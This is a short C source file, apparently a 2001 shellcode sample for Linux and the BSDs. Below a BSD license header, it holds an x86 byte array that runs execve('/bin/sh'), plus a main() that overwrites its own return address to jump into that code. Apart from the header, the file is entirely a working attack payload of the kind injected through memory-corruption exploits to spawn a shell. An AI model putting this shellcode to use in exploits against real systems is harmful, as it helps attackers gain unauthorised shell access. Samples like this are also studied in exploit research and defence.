/*
 * execve /bin/sh
 *
 * Linux.
 * OpenBSD.
 * FreeBSD. 
 * NetBSD ( maybe )
 *
 *  Copyright (c) 2001 Nicola Bonelli <bonelli@antifork.org>
 *
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

char shellcode[] =
"\xeb\x2f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
"\x8c\xe0\x21\xc0\x74\x04\xb0\x3b\xeb\x02\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\x52\x51\x53\x53\xcd\x80\x31\xdb"
"\x53\x53\x89\xd8\x40\xcd\x80\xe8\xcc\xff\xff\xff/bin/sh";


int main() {
   long *ret;

   ret = (long *)&ret + 2;
   (*ret) = (long)shellcode;

   return 0;
}

